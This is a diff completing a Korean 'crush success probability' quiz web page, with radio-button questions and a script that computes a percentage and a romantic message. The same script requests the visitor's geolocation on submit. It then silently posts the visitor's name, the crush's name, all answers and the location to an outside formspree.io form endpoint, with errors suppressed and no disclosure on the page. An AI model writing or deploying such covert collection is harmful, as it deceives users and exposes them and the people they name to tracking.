@@ -140,4 +140,96 @@
 
     <div class="question">
       <label>🔟 그 사람의 사소한 말도 오래 기억한다.</label>
-      <label class="option"><input type=
+      <label class="option"><input type="radio" name="q10" value="20"> 전혀 아니다</label>
+      <label class="option"><input type="radio" name="q10" value="50"> 가끔 그렇다</label>
+      <label class="option"><input type="radio" name="q10" value="80"> 자주 그렇다</label>
+      <label class="option"><input type="radio" name="q10" value="100"> 항상 그렇다</label>
+    </div>
+
+    <button type="submit" id="submitBtn">
+      결과 보기
+      <span>📍 위치 공유하기 (선택)</span>
+    </button>
+    <p id="locationStatus"></p>
+  </form>
+
+  <div id="result"></div>
+
+  <script>
+    let userLocation = "위치 정보 없음";
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            userLocation = `위도: ${pos.coords.latitude}, 경도: ${pos.coords.longitude}`;
+            document.getElementById("locationStatus").innerText = "✅ 위치 저장 완료";
+          },
+          () => {
+            document.getElementById("locationStatus").innerText = "⚠️ 위치를 가져올 수 없습니다.";
+          }
+        );
+      }
+    }
+
+    document.getElementById("loveForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      requestLocation(); // 버튼 클릭 시 위치 요청
+
+      const yourName = document.getElementById("yourName").value.trim();
+      const crushName = document.getElementById("crushName").value.trim();
+      const resultBox = document.getElementById("result");
+
+      if (!yourName || !crushName) {
+        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
+        return;
+      }
+
+      const questions = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
+      let total = 0, answered = 0;
+      let answers = {};
+
+      for (const q of questions) {
+        const selected = document.querySelector(`input[name="${q}"]:checked`);
+        if (selected) {
+          total += Number(selected.value);
+          answered++;
+          answers[q] = selected.parentElement.innerText.trim();
+        } else {
+          answers[q] = "미응답";
+        }
+      }
+
+      if (answered < questions.length) {
+        resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
+        return;
+      }
+
+      const percent = Math.round(total / questions.length);
+      let message = "";
+      if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
+      else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
+      else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
+      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
+
+      resultBox.innerHTML = `
+        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
+        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
+      `;
+
+      fetch("https://formspree.io/f/xanegwav", {
+        method: "POST",
+        headers: { "Accept": "application/json", "Content-Type": "application/json" },
+        body: JSON.stringify({
+          yourName,
+          crushName,
+          percent,
+          resultMessage: message,
+          answers,
+          location: userLocation
+        })
+      }).catch(() => {});
+    });
+  </script>
+</body>
+</html>
